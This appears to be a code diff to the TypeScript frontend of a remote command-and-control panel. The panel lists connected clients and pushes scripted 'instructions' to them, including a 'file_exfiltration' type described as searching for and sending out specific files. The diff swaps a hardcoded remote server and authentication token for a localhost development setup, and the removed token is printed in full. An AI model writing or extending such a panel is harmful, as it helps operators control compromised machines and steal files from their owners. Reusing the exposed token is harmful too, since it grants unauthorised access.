@@ -15,8 +15,8 @@ export interface InstructionType {
 
 export interface ClientInstruction {
   id: string;
-  name: string;
-  system: string;
+  name?: string;
+  system?: string;
   currentInstruction?: string;
   instruction?: string;
   lastActivity?: string;
@@ -41,9 +41,17 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
-// Server configuration - Updated to include both endpoint patterns
-const SERVER_BASE_URL = 'https://neea.fun';
-// API Endpoints aligned with the WSGI configuration in the Apache site config
+// Server configuration - Update to use local development server when running locally
+// and the production server when deployed
+const isDevelopment = window.location.hostname === 'localhost' || 
+                      window.location.hostname === '127.0.0.1';
+
+// In development, use local Flask server, in production use configured domain
+const SERVER_BASE_URL = isDevelopment 
+  ? 'http://localhost:8000'
+  : (window.location.protocol + '//' + window.location.hostname);
+
+// API Endpoints
 const API_CLIENTS_ENDPOINT = '/api/clients';
 const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
 const API_CONFIG_ENDPOINT = '/api/get_config';
@@ -51,8 +59,8 @@ const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
 // Legacy endpoint for backward compatibility
 const API_GET_INSTRUCTIONS_ENDPOINT = '/get_instructions';
 
-// Authentication token - Must match what the server expects
-const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
+// Authentication token - Not needed for local development server
+const AUTH_TOKEN = '';
 
 // Function to log all client communication for debugging
 function logClientCommunication(direction: 'SENT' | 'RECEIVED', endpoint: string, data: any, status?: number, error?: Error) {
@@ -83,9 +91,6 @@ function logClientCommunication(direction: 'SENT' | 'RECEIVED', endpoint: string
   
   // Log to console for browser debugging
   console.debug(`CLIENT-COMM: ${logEntry}`);
-  
-  // In a production environment, you might want to send these logs to the server
-  // for storage in allin.log, but for now we'll keep them in the browser console
 }
 
 // Extract scripts from instructions.py
@@ -112,17 +117,22 @@ export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  */
 export async function getScripts(): Promise<ScriptsData> {
   const endpoint = `${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`;
-  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
+  const headers: HeadersInit = {
+    'Accept': 'application/json'
+  };
+  
+  // Only add Authorization header if not in development and token exists
+  if (!isDevelopment && AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
+  logClientCommunication('SENT', endpoint, { headers });
   
   try {
     console.log("Fetching instructions from API:", endpoint);
     
-    // Use the API endpoint that's handled by the WSGI application
     const response = await fetch(endpoint, {
-      headers: {
-        'Authorization': `Bearer ${AUTH_TOKEN}`,
-        'Accept': 'application/json'
-      }
+      headers
     });
     
     if (!response.ok) {
@@ -154,17 +164,22 @@ export async function getScripts(): Promise<ScriptsData> {
 // Get client instructions using the legacy endpoint (for backward compatibility)
 export async function getClientInstructions(clientId: string): Promise<string | null> {
   const endpoint = `${SERVER_BASE_URL}${API_GET_INSTRUCTIONS_ENDPOINT}?client_id=${clientId}`;
-  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'text/plain' } });
+  const headers: HeadersInit = {
+    'Accept': 'text/plain'
+  };
+  
+  // Only add Authorization header if not in development and token exists
+  if (!isDevelopment && AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
+  logClientCommunication('SENT', endpoint, { headers });
   
   try {
     console.log(`Fetching instructions for client ${clientId} using legacy endpoint`);
     
-    // Use the legacy endpoint with client_id query parameter
     const response = await fetch(endpoint, {
-      headers: {
-        'Authorization': `Bearer ${AUTH_TOKEN}`,
-        'Accept': 'text/plain'  // Explicitly request text data instead of binary
-      }
+      headers
     });
     
     if (!response.ok) {
@@ -217,17 +232,22 @@ export async function getInstructionTypes(): Promise<InstructionType[]> {
 // Get all clients and their current instructions
 export async function getClients(): Promise<ClientInstruction[]> {
   const endpoint = `${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`;
-  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
+  const headers: HeadersInit = {
+    'Accept': 'application/json'
+  };
+  
+  // Only add Authorization header if not in development and token exists
+  if (!isDevelopment && AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
+  logClientCommunication('SENT', endpoint, { headers });
   
   try {
     console.log("Fetching clients from API:", endpoint);
     
-    // Use the correct API endpoint from the WSGI server
     const response = await fetch(endpoint, {
-      headers: {
-        'Authorization': `Bearer ${AUTH_TOKEN}`,
-        'Accept': 'application/json'
-      }
+      headers
     });
     
     if (!response.ok) {
@@ -253,19 +273,25 @@ export async function getClients(): Promise<ClientInstruction[]> {
 export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
   const endpoint = `${SERVER_BASE_URL}${API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId)}`;
   const requestBody = { instruction: instructionId };
+  
+  const headers: HeadersInit = {
+    'Content-Type': 'application/json',
+    'Accept': 'application/json'
+  };
+  
+  // Only add Authorization header if not in development and token exists
+  if (!isDevelopment && AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
   logClientCommunication('SENT', endpoint, requestBody);
   
   try {
     console.log(`Updating client ${clientId} with instruction ${instructionId}`);
     
-    // Use the correct API endpoint with proper path parameter replacement
     const response = await fetch(endpoint, {
       method: 'PUT',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${AUTH_TOKEN}`,
-        'Accept': 'application/json'
-      },
+      headers,
       body: JSON.stringify(requestBody),
     });
     
@@ -290,16 +316,22 @@ export async function updateClientInstruction(clientId: string, instructionId: s
 // Get server configuration
 export async function getServerConfig() {
   const endpoint = `${SERVER_BASE_URL}${API_CONFIG_ENDPOINT}`;
-  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
+  const headers: HeadersInit = {
+    'Accept': 'application/json'
+  };
+  
+  // Only add Authorization header if not in development and token exists
+  if (!isDevelopment && AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
+  logClientCommunication('SENT', endpoint, { headers });
   
   try {
     console.log("Fetching server config from API:", endpoint);
     
     const response = await fetch(endpoint, {
-      headers: {
-        'Authorization': `Bearer ${AUTH_TOKEN}`,
-        'Accept': 'application/json'
-      }
+      headers
     });
     
     if (!response.ok) {
